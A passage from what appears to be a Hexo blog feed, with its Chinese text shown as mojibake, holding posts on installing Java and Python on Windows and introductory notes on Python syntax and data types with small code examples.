        <content type="html"><![CDATA[<h1 id="javaå®‰è£…"><a href="#javaå®‰è£…" class="headerlink" title="javaå®‰è£…"></a>javaå®‰è£…</h1><ol><li><p>å‰å¾€<a href="https://www.oracle.com/java/technologies/downloads/">Java Downloads | Oracle</a>ä¸‹è½½åˆé€‚è‡ªå·±è®¡ç®—æœºç‰ˆæœ¬çš„JDK</p></li><li><p>ä¸€ç›´Nextï¼Œé‡åˆ°ä¿®æ”¹è·¯å¾„è‡ªè¡Œä¿®æ”¹</p></li><li><p>å®‰è£…æˆåŠŸåï¼Œæ·»åŠ ç¯å¢ƒå˜é‡ï¼Œwin+R ï¼Œè¾“å…¥controæ‰“å¼€æ§åˆ¶é¢æ¿ï¼Œç³»ç»Ÿå’Œå®‰å…¨-&gt;ç³»ç»Ÿ-&gt;é«˜çº§ç³»ç»Ÿè®¾ç½®-&gt;ç¯å¢ƒå˜é‡</p><p>æ·»åŠ ä¸¤ä¸ªç³»ç»Ÿå˜é‡<code>CLASSPATH = .;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar;</code></p><p><img src="https://z3.ax1x.com/2021/11/06/IlCtx0.png" alt="IlCtx0.png"><code>JAVA_HOME = ä½ çš„å®‰è£…ç›®å½•</code></p><p><img src="https://z3.ax1x.com/2021/11/06/IlC0ZF.png" alt="IlC0ZF.png">æ·»åŠ è‡³Path</p><p><img src="https://z3.ax1x.com/2021/11/06/IlCBa4.png" alt="IlCBa4.png"></p></li><li><p>è‡³æ­¤å·²ç»æˆåŠŸäº†ï¼Œè¿è¡Œ<code>java</code>ï¼Œ<code>javac</code>ï¼Œ<code>java --version</code>æ­£å¸¸åˆ™å®‰è£…æˆåŠŸ</p><p><img src="https://z3.ax1x.com/2021/11/06/IlChZD.png" alt="IlChZD.png"></p></li></ol><p>jdkï¼šJava Development Kitï¼Œæ˜¯å¼€å‘è€…ä½¿ç”¨çš„</p><p>jreï¼š Java Runtime Environmentï¼Œç”¨æ¥è¿è¡Œjava</p><p>æ³¨ï¼š</p><ol><li><p>jdké›†æˆå®‰è£…äº†jreï¼Œæœ‰äº›æ—¶å€™jreä¼šæ²¡å®‰è£…ï¼Œå¯ä»¥åˆ°<a href="https://www.java.com/en/download/manual.jsp">Java Downloads for All Operating Systems</a>ä¸‹è½½å®‰è£…åŒ…è‡ªå·±å®‰è£…ï¼Œå½“ç„¶å•ç‹¬å®‰è£…jreä¹Ÿè¡Œ</p></li><li><p>Oracleç®¡ç†çš„jdkå’Œjreä¸ç”¨ä¸Šè¿°çš„æ·»åŠ ç¯å¢ƒå˜é‡ï¼Œå®ƒä¼šè‡ªå·±æ·»åŠ </p></li></ol>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pythonå®‰è£…</title>
      <link href="/2021/11/06/python-an-zhuang/"/>
      <url>/2021/11/06/python-an-zhuang/</url>
      
        <content type="html"><![CDATA[<h1 id="Windowsä¸‹å®‰è£…python"><a href="#Windowsä¸‹å®‰è£…python" class="headerlink" title="Windowsä¸‹å®‰è£…python"></a>Windowsä¸‹å®‰è£…python</h1><h2 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h2><ol><li><p>å®‰è£…åŒ…ä¸‹è½½ï¼Œ<a href="https://www.python.org/downloads/windows/">Python Releases for Windows | Python.org</a>ï¼Œæ ¹æ®è‡ªå·±è®¡ç®—æœºçš„é…ç½®é€‰æ‹©åˆé€‚ç‰ˆæœ¬å®‰è£…ï¼Œæˆ‘é€‰æ‹©äº†ä¸€ä¸ª3.8.8çš„ç‰ˆæœ¬æµ‹è¯•</p></li><li><p>åŒå‡»å¼€å§‹å®‰è£…</p><p><img src="https://z3.ax1x.com/2021/11/06/IK7QxI.png" alt="IK7QxI.png"></p></li></ol><p>å¯ä»¥ç›´æ¥é€‰æ‹©Install Nowï¼Œå»ºè®®é€‰æ‹©ä¸‹é¢è‡ªå®šä¹‰è·¯å¾„æ–¹ä¾¿ç®¡ç†ï¼Œå‹¾é€‰Add Pathï¼ŒNextï¼ŒNext</p><p><img src="https://z3.ax1x.com/2021/11/06/IK71Mt.png" alt="IK71Mt.png"></p><p>å‹¾é€‰å¦‚å›¾é€‰é¡¹ï¼Œè·¯å¾„è‡ªé€‰ï¼ŒInstallï¼ˆé™¤é»˜è®¤çš„ä¹Ÿå¯ä»¥ä¸é€‰ï¼‰</p><ol start="3"><li><p>å®‰è£…æˆåŠŸåï¼Œwin+R ï¼Œè¾“å…¥cmdè¿è¡Œå‘½ä»¤è¡Œï¼Œè¿è¡Œå‘½ä»¤<code>python -V</code>ï¼Œ<code>pip -V</code>ï¼Œæ˜¾ç¤ºç‰ˆæœ¬åˆ™å®‰è£…æˆåŠŸ</p></li><li><p>è‹¥æ²¡ç‚¹Add Path å¯ä»¥é‡æ–°è£…ï¼Œç‚¹å‡»å®‰è£…åŒ…ï¼Œæˆ–è€…è‡ªè¡Œæ·»åŠ </p><p>win+R ï¼Œè¾“å…¥controæ‰“å¼€æ§åˆ¶é¢æ¿ï¼Œç³»ç»Ÿå’Œå®‰å…¨-&gt;ç³»ç»Ÿ-&gt;é«˜çº§ç³»ç»Ÿè®¾ç½®-&gt;ç¯å¢ƒå˜é‡</p><p>æ·»åŠ å¦‚ä¸‹</p><p><img src="https://z3.ax1x.com/2021/11/06/IK73sP.png" alt="IK73sP.png"></p></li></ol><h2 id="å®‰è£…å¤šä¸ªä¸åŒç‰ˆæœ¬"><a href="#å®‰è£…å¤šä¸ªä¸åŒç‰ˆæœ¬" class="headerlink" title="å®‰è£…å¤šä¸ªä¸åŒç‰ˆæœ¬"></a>å®‰è£…å¤šä¸ªä¸åŒç‰ˆæœ¬</h2><p>æŒ‰ç…§ä¸Šè¿°å®‰è£…æ­¥éª¤é€‰æ‹©å‡ ä¸ªä¸åŒç‰ˆæœ¬çš„å®‰è£…</p><p>å·²å®‰è£…ä¸¤ä¸ªä¸ºä¾‹ï¼Œæˆ‘å®‰è£…äº†ä¸€ä¸ª2.xå’Œ3.xç‰ˆæœ¬çš„</p><p><img src="https://z3.ax1x.com/2021/11/06/IK78qf.png" alt="IK78qf.png"></p><p>è¿›å…¥ä¸€ä¸ªç›®å½•ï¼Œå¤åˆ¶<code>python.exe</code>ï¼Œ<code>pythonw.exe</code>ä¸¤ä¸ªæ–‡ä»¶ï¼Œå¹¶ä¸”é‡å‘½åï¼Œè°ƒç”¨æ—¶å°±æ˜¯ç”¨ä½ é‡å‘½çš„åï¼Œå¯ä»¥éšæ—¶æ”¹ï¼Œä¸‹å›¾ä¸ºç»“æœ</p><p><img src="https://z3.ax1x.com/2021/11/06/IK7JZ8.png" alt="IK7JZ8.png"></p><p>è¿›å…¥Scripts</p><p>æ­£å¸¸åº”è¯¥æ˜¯å­˜åœ¨ä¸¤ä¸ªæ–‡ä»¶ï¼ˆ<code>pip.exe</code>ã€<code>pipx.exe</code>ï¼‰ï¼Œå¦‚æ²¡æœ‰åè€…ï¼Œè‡ªå·±å¤åˆ¶æ”¹ä¸€ä¸ªï¼Œç”¨ä¸Šè¿°å‘½ä»¤æµ‹è¯•æ—¶å€™æˆåŠŸ</p><p>å…¶ä»–çš„ç‰ˆæœ¬ä¸€ä¸ªæ„æ€ï¼Œæˆ‘ä¸€èˆ¬ä¼šç•™ä¸€ä¸ªä¸æ”¹ï¼Œç›´æ¥ç”¨<code>python</code>è°ƒç”¨å½“åšä¸»ç”¨ç‰ˆæœ¬ï¼Œæ¯•ç«Ÿå°‘æ‰“ä¸€ä¸ªå­—æ¯â€¦â€¦</p>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pythonå­¦ä¹ </title>
      <link href="/2021/10/10/python-study/"/>
      <url>/2021/10/10/python-study/</url>
      
        <content type="html"><![CDATA[<h1 id="pythonå­¦ä¹ "><a href="#pythonå­¦ä¹ " class="headerlink" title="pythonå­¦ä¹ "></a>pythonå­¦ä¹ </h1><h2 id="åŸºç¡€è¯­æ³•"><a href="#åŸºç¡€è¯­æ³•" class="headerlink" title="åŸºç¡€è¯­æ³•"></a>åŸºç¡€è¯­æ³•</h2><h3 id="æ ‡è¯†ç¬¦"><a href="#æ ‡è¯†ç¬¦" class="headerlink" title="æ ‡è¯†ç¬¦"></a>æ ‡è¯†ç¬¦</h3><ol><li>é¦–å­—æ¯å¿…é¡»æ˜¯å­—æ¯æˆ–è€…ä¸‹åˆ’çº¿<code>_</code></li><li>å…¶ä»–éƒ¨åˆ†ç”±å­—æ¯ã€æ•°å­—ã€ä¸‹åˆ’çº¿ç»„æˆ</li><li>å¤§å°å†™æ•æ„Ÿ</li><li>python3 å¯ä¸­æ–‡ä¹Ÿå¯éASCIIæ ‡è¯†ç¬¦</li></ol><h3 id="pythonä¿ç•™å­—"><a href="#pythonä¿ç•™å­—" class="headerlink" title="pythonä¿ç•™å­—"></a>pythonä¿ç•™å­—</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> keyword<span class="token keyword">print</span><span class="token punctuation">(</span>keyword<span class="token punctuation">.</span>kwlist<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'False'</span><span class="token punctuation">,</span> <span class="token string">'None'</span><span class="token punctuation">,</span> <span class="token string">'True'</span><span class="token punctuation">,</span> <span class="token string">'and'</span><span class="token punctuation">,</span> <span class="token string">'as'</span><span class="token punctuation">,</span> <span class="token string">'assert'</span><span class="token punctuation">,</span> <span class="token string">'async'</span><span class="token punctuation">,</span> <span class="token string">'await'</span><span class="token punctuation">,</span> <span class="token string">'break'</span><span class="token punctuation">,</span> <span class="token string">'class'</span><span class="token punctuation">,</span> <span class="token string">'continue'</span><span class="token punctuation">,</span> <span class="token string">'def'</span><span class="token punctuation">,</span> <span class="token string">'del'</span><span class="token punctuation">,</span> <span class="token string">'elif'</span><span class="token punctuation">,</span> <span class="token string">'else'</span><span class="token punctuation">,</span> <span class="token string">'except'</span><span class="token punctuation">,</span> <span class="token string">'finally'</span><span class="token punctuation">,</span> <span class="token string">'for'</span><span class="token punctuation">,</span> <span class="token string">'from'</span><span class="token punctuation">,</span> <span class="token string">'global'</span><span class="token punctuation">,</span> <span class="token string">'if'</span><span class="token punctuation">,</span> <span class="token string">'import'</span><span class="token punctuation">,</span> <span class="token string">'in'</span><span class="token punctuation">,</span> <span class="token string">'is'</span><span class="token punctuation">,</span> <span class="token string">'lambda'</span><span class="token punctuation">,</span> <span class="token string">'nonlocal'</span><span class="token punctuation">,</span> <span class="token string">'not'</span><span class="token punctuation">,</span> <span class="token string">'or'</span><span class="token punctuation">,</span> <span class="token string">'pass'</span><span class="token punctuation">,</span> <span class="token string">'raise'</span><span class="token punctuation">,</span> <span class="token string">'return'</span><span class="token punctuation">,</span> <span class="token string">'try'</span><span class="token punctuation">,</span> <span class="token string">'while'</span><span class="token punctuation">,</span> <span class="token string">'with'</span><span class="token punctuation">,</span> <span class="token string">'yield'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="æ³¨é‡Š"><a href="#æ³¨é‡Š" class="headerlink" title="æ³¨é‡Š"></a>æ³¨é‡Š</h3><p>pythonä¸­<code>'</code>å’Œ<code>"</code>ä¸€æ ·</p><pre class="line-numbers language-none"><code class="language-none">#å•è¡Œæ³¨é‡Š'''å¤šè¡Œæ³¨é‡Š'''"""å¤šè¡Œæ³¨é‡Š"""<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ç¼©è¿›"><a href="#ç¼©è¿›" class="headerlink" title="ç¼©è¿›"></a>ç¼©è¿›</h3><p>pythonä¸ä½¿ç”¨å¤§æ‹¬å·ï¼Œä½¿ç”¨ç¼©è¿›å¯¹é½</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span> expression <span class="token punctuation">:</span>    XXX<span class="token keyword">else</span> <span class="token punctuation">:</span>    XXX<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="å¤šè¡Œè¿æ¥"><a href="#å¤šè¡Œè¿æ¥" class="headerlink" title="å¤šè¡Œè¿æ¥"></a>å¤šè¡Œè¿æ¥</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">var <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">+</span> \ <span class="token number">2</span> <span class="token operator">+</span> \    <span class="token number">3</span><span class="token keyword">print</span><span class="token punctuation">(</span>var<span class="token punctuation">)</span><span class="token comment">#6</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="æ•°å­—ç±»å‹"><a href="#æ•°å­—ç±»å‹" class="headerlink" title="æ•°å­—ç±»å‹"></a>æ•°å­—ç±»å‹</h3><p>pythonä¸­æ•°å­—æœ‰å››ç§ç±»å‹ï¼šæ•´æ•°ã€å¸ƒå°”å‹ã€æµ®ç‚¹æ•°å’Œå¤æ•°</p><h3 id="å­—ç¬¦ä¸²"><a href="#å­—ç¬¦ä¸²" class="headerlink" title="å­—ç¬¦ä¸²"></a>å­—ç¬¦ä¸²</h3><ol><li>pythonä¸­å•å¼•å·ã€åŒå¼•å·ä½¿ç”¨å®Œå…¨ç›¸åŒ</li><li>è½¬ä¹‰å­—ç¬¦<code>\</code></li><li><code>r'test\ntest'</code>ï¼Œ<code>r</code>å¯ä»¥ä½¿<code>\n</code>ä¸è½¬ä¹‰</li><li><code>"this " "is " "string"</code>è¾“å‡º<code>this is string</code></li><li><code>+</code>è¿ç®—ç¬¦è¿æ¥å­—ç¬¦ï¼Œ<code>*</code>è¿ç®—ç¬¦é‡å¤å­—ç¬¦</li><li>æ£€ç´¢ä»å·¦åˆ°å³ä»0å¼€å§‹ï¼Œä»å³åˆ°å·¦ä»-1å¼€å§‹</li><li>ä¸€ä¸ªå­—ç¬¦å°±æ˜¯ä¸€ä¸ªé•¿åº¦ä¸º1çš„å­—ç¬¦ä¸²</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python">var <span class="token operator">=</span> <span class="token string">"this "</span> <span class="token string">"is "</span> <span class="token string">"string"</span><span class="token keyword">print</span><span class="token punctuation">(</span>var<span class="token punctuation">)</span><span class="token comment"># this is string</span><span class="token keyword">print</span><span class="token punctuation">(</span>var <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token comment"># this is stringthis is string</span><span class="token keyword">print</span><span class="token punctuation">(</span>var <span class="token operator">+</span> <span class="token string">'111'</span><span class="token punctuation">)</span><span class="token comment"># this is string111</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'ssss\nsssss'</span><span class="token punctuation">)</span><span class="token comment"># ssss</span><span class="token comment"># sssss</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">r"ssss\nssss"</span><span class="token punctuation">)</span><span class="token comment"># ssss\nssss</span><span class="token keyword">print</span><span class="token punctuation">(</span>var<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment"># this is string</span><span class="token keyword">print</span><span class="token punctuation">(</span>var<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment"># this is string</span><span class="token keyword">print</span><span class="token punctuation">(</span>var<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment"># this is strin</span><span class="token keyword">print</span><span class="token punctuation">(</span>var<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment"># ti ssrn</span><span class="token triple-quoted-string string">'''this is stringthis is stringthis is stringthis is string111sssssssssssss\nssssthis is stringthis is stringthis is strinti ssrn'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ä¸€è¡Œå¤šæ¡è¯­å¥"><a href="#ä¸€è¡Œå¤šæ¡è¯­å¥" class="headerlink" title="ä¸€è¡Œå¤šæ¡è¯­å¥"></a>ä¸€è¡Œå¤šæ¡è¯­å¥</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token punctuation">;</span> x <span class="token operator">=</span> <span class="token string">'test'</span><span class="token punctuation">;</span> sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>write<span class="token punctuation">(</span>x <span class="token operator">+</span> <span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''test'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="å¤šä¸ªè¯­å¥ç»„æˆä»£ç ç»„"><a href="#å¤šä¸ªè¯­å¥ç»„æˆä»£ç ç»„" class="headerlink" title="å¤šä¸ªè¯­å¥ç»„æˆä»£ç ç»„"></a>å¤šä¸ªè¯­å¥ç»„æˆä»£ç ç»„</h3><p>é¦–è¡Œä»¥å…³é”®å­—å¼€å§‹ï¼Œä»¥å†’å·( : )ç»“æŸï¼Œè¯¥è¡Œä¹‹åçš„ä¸€è¡Œæˆ–å¤šè¡Œä»£ç æ„æˆä»£ç ç»„</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span> expression <span class="token punctuation">:</span>    suite<span class="token keyword">elif</span> expression <span class="token punctuation">:</span>    suite <span class="token keyword">else</span> <span class="token punctuation">:</span>    suite<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="è¾“å‡º"><a href="#è¾“å‡º" class="headerlink" title="è¾“å‡º"></a>è¾“å‡º</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">var <span class="token operator">=</span> <span class="token string">'test'</span><span class="token comment"># æ¢è¡Œè¾“å‡º</span><span class="token keyword">print</span><span class="token punctuation">(</span>var<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'---------'</span><span class="token punctuation">)</span><span class="token comment"># ä¸æ¢è¡Œè¾“å‡º</span><span class="token keyword">print</span><span class="token punctuation">(</span>var<span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">" "</span><span class="token punctuation">)</span>  <span class="token comment"># ä»¥ç©ºæ ¼åˆ†éš”</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''test1---------test 1 '''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="å¯¼å…¥æ¨¡å—"><a href="#å¯¼å…¥æ¨¡å—" class="headerlink" title="å¯¼å…¥æ¨¡å—"></a>å¯¼å…¥æ¨¡å—</h3><p>åœ¨ python ç”¨ <strong>import</strong> æˆ–è€… <strong>fromâ€¦import</strong> æ¥å¯¼å…¥ç›¸åº”çš„æ¨¡å—</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token keyword">from</span> sys <span class="token keyword">import</span> argv<span class="token punctuation">,</span>path<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="æ•°æ®ç±»å‹"><a href="#æ•°æ®ç±»å‹" class="headerlink" title="æ•°æ®ç±»å‹"></a>æ•°æ®ç±»å‹</h2><p>pythonçš„å˜é‡å°±æ˜¯å¯¹è±¡</p><p>pythonå˜é‡ç›´æ¥èµ‹å€¼ï¼Œä¸éœ€è¦å£°æ˜</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">a <span class="token operator">=</span> <span class="token number">1</span>b <span class="token operator">=</span> <span class="token number">1.2</span>c <span class="token operator">=</span> <span class="token string">'test'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="å¤šä¸ªå˜é‡èµ‹å€¼"><a href="#å¤šä¸ªå˜é‡èµ‹å€¼" class="headerlink" title="å¤šä¸ªå˜é‡èµ‹å€¼"></a>å¤šä¸ªå˜é‡èµ‹å€¼</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">a <span class="token operator">=</span> b <span class="token operator">=</span>c <span class="token operator">=</span><span class="token number">1</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c <span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'test'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="ä¸å¯å˜æ•°æ®"><a href="#ä¸å¯å˜æ•°æ®" class="headerlink" title="ä¸å¯å˜æ•°æ®"></a>ä¸å¯å˜æ•°æ®</h3><h4 id="Number-æ•°å­—"><a href="#Number-æ•°å­—" class="headerlink" title="Number(æ•°å­—)"></a>Number(æ•°å­—)</h4><p>æ”¯æŒintã€floatã€boolã€complexï¼ˆå¤æ•°ï¼‰</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">5.5</span><span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token operator">+</span><span class="token number">3j</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">type</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''&lt;class 'int'&gt; &lt;class 'float'&gt; &lt;class 'bool'&gt; &lt;class 'complex'&gt;'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>type()</code>å‡½æ•°æŸ¥è¯¢å˜é‡çš„ç±»å‹</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">a <span class="token operator">=</span> <span class="token number">111</span><span class="token builtin">isinstance</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''True'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>isinstance(x,x)</code>å¯¹æ¯”å¯¹è±¡ç±»å‹</p><ul><li><code>type()</code>ä¸ä¼šè®¤ä¸ºå­ç±»æ˜¯ä¸€ç§çˆ¶ç±»ç±»å‹</li><li><code>isinstance()</code>ä¼šè®¤ä¸ºå­ç±»æ˜¯ä¸€ç§çˆ¶ç±»ç±»å‹</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">:</span>    <span class="token keyword">pass</span><span class="token keyword">class</span> <span class="token class-name">B</span><span class="token punctuation">(</span>A<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">pass</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">isinstance</span><span class="token punctuation">(</span>A<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> A<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># True</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">type</span><span class="token punctuation">(</span>A<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> A<span class="token punctuation">)</span><span class="token comment"># Ture</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">isinstance</span><span class="token punctuation">(</span>B<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> A<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># Ture</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">type</span><span class="token punctuation">(</span>B<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> A<span class="token punctuation">)</span><span class="token comment"># False</span><span class="token triple-quoted-string string">'''TrueTrueTrueFalse'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="boolå€¼å¤„ç†"><a href="#boolå€¼å¤„ç†" class="headerlink" title="boolå€¼å¤„ç†"></a>boolå€¼å¤„ç†</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">issubclass</span><span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># Ture</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token boolean">True</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment"># Ture</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token boolean">False</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment"># Ture</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token boolean">True</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment"># 2</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token boolean">False</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment"># 1</span>var1 <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">print</span><span class="token punctuation">(</span>var1 <span class="token keyword">is</span> <span class="token boolean">True</span><span class="token punctuation">)</span><span class="token comment"># False</span>var2 <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">print</span><span class="token punctuation">(</span>var2 <span class="token keyword">is</span> <span class="token boolean">False</span><span class="token punctuation">)</span><span class="token comment"># False</span><span class="token triple-quoted-string string">'''TrueTrueTrue21FalseFalse'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="åˆ é™¤å¯¹è±¡"><a href="#åˆ é™¤å¯¹è±¡" class="headerlink" title="åˆ é™¤å¯¹è±¡"></a>åˆ é™¤å¯¹è±¡</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">del</span> a<span class="token keyword">del</span> var1<span class="token punctuation">,</span>var2<span class="token triple-quoted-string string">'''å†æ¬¡printä¼šæŠ¥é”™'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="æ•°å€¼è¿ç®—"><a href="#æ•°å€¼è¿ç®—" class="headerlink" title="æ•°å€¼è¿ç®—"></a>æ•°å€¼è¿ç®—</h5><ol><li>é™¤æ³•<code>/</code>è¿”å›ä¸€ä¸ªæµ®ç‚¹æ•°ï¼Œ<code>//</code>è¿”å›ä¸€ä¸ªæ•´æ•°</li><li><code>*</code>ä¹˜æ³•ï¼Œ<code>**</code>ä¹˜æ–¹</li><li><code>%</code>å–ä½™</li><li>æ··åˆè¿ç®—æ—¶æ•´å‹è½¬æ¢ä¸ºæµ®ç‚¹å‹</li><li>å¤æ•°ä½¿ç”¨<code>complex(a,b)</code>è¡¨ç¤º<code>a+bj</code></li></ol><h4 id="String-å­—ç¬¦ä¸²"><a href="#String-å­—ç¬¦ä¸²" class="headerlink" title="String(å­—ç¬¦ä¸²)"></a>String(å­—ç¬¦ä¸²)</h4><h5 id="å­—ç¬¦ä¸²æˆªå–æ ¼å¼"><a href="#å­—ç¬¦ä¸²æˆªå–æ ¼å¼" class="headerlink" title="å­—ç¬¦ä¸²æˆªå–æ ¼å¼"></a>å­—ç¬¦ä¸²æˆªå–æ ¼å¼</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python">å˜é‡å<span class="token punctuation">[</span>å¤´ä¸‹æ ‡<span class="token punctuation">:</span>å°¾ä¸‹æ ‡<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä»å‰é¢ç´¢å¼•  0 1 2 3 4 